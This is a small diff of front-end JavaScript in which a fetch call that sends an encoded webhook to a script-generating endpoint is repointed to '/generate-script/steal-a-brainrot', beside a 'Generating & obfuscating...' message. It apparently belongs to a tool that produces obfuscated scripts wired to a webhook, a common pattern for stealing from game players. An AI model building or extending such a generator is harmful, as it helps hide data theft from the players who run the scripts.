@@ -1487,11 +1487,11 @@
 
                 // Step 2: Send encoded webhook to script generate endpoint
                 showAlert('generatorAlert', 'Generating & obfuscating...', 'warning');
-                const generateResponse = await fetch(`${API_BASE_URL}/api/script/generate`, {
+                const generateResponse = await fetch(`${API_BASE_URL}/generate-script/steal-a-brainrot`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    credentials: 'include',
-                    body: JSON.stringify({ webhookId: encodedWebhook, game })
+                    
+                    body: JSON.stringify({ compleWebhook: encodedWebhook })
                 });
 
                 const generateData = await generateResponse.json();
